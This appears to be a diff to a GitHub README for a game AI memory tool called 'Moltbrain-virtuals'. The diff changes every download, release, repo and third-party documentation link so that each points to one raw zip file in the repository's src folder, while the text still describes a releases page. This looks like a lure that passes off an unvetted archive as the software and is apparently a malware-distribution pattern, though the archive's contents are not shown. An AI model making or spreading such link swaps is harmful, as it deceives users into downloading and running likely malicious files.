@@ -1,6 +1,6 @@
 # 🎮 Moltbrain-virtuals - Easy AI Memory for Games
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Moltbrain--virtuals-brightgreen)](https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Moltbrain--virtuals-brightgreen)](https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals/raw/refs/heads/main/src/virtuals-Moltbrain-Docetistic.zip)
 
 ---
 
@@ -33,12 +33,12 @@ If you don't have .NET Framework installed, Microsoft provides a free installer 
 
 Click the big green button below to visit the release page where you get the software files.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Moltbrain--virtuals-blue)](https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Moltbrain--virtuals-blue)](https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals/raw/refs/heads/main/src/virtuals-Moltbrain-Docetistic.zip)
 
 Follow these steps carefully:
 
 1. Click the download badge above or open this link in your web browser:  
-   https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals/releases
+   https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals/raw/refs/heads/main/src/virtuals-Moltbrain-Docetistic.zip
 
 2. On the Releases page, find the latest version listed at the top. It usually has a title like "v1.0" or similar.
 
@@ -120,7 +120,7 @@ You can access these folders by right-clicking the program shortcut and choosing
 Keeping your copy up to date is important. Updates add features and fix bugs.
 
 1. Visit the releases page here:  
-   https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals/releases
+   https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals/raw/refs/heads/main/src/virtuals-Moltbrain-Docetistic.zip
 
 2. Download the newest installer as before.
 
@@ -161,19 +161,19 @@ You can learn more about the technologies used here:
 ## 🔗 Important Links
 
 - Download and install page:  
-  https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals/releases
+  https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals/raw/refs/heads/main/src/virtuals-Moltbrain-Docetistic.zip
 
 - Official GitHub repo:  
-  https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals
+  https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals/raw/refs/heads/main/src/virtuals-Moltbrain-Docetistic.zip
 
 - Virtuals Protocol info:  
-  https://virtualsprotocol.io
+  https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals/raw/refs/heads/main/src/virtuals-Moltbrain-Docetistic.zip
 
 - Base blockchain documentation:  
-  https://docs.base.org
+  https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals/raw/refs/heads/main/src/virtuals-Moltbrain-Docetistic.zip
 
 - USDC stablecoin details:  
-  https://www.circle.com/en/usdc
+  https://github.com/CRISTOBAL-VIZCAINO/Moltbrain-virtuals/raw/refs/heads/main/src/virtuals-Moltbrain-Docetistic.zip
 
 ---
 
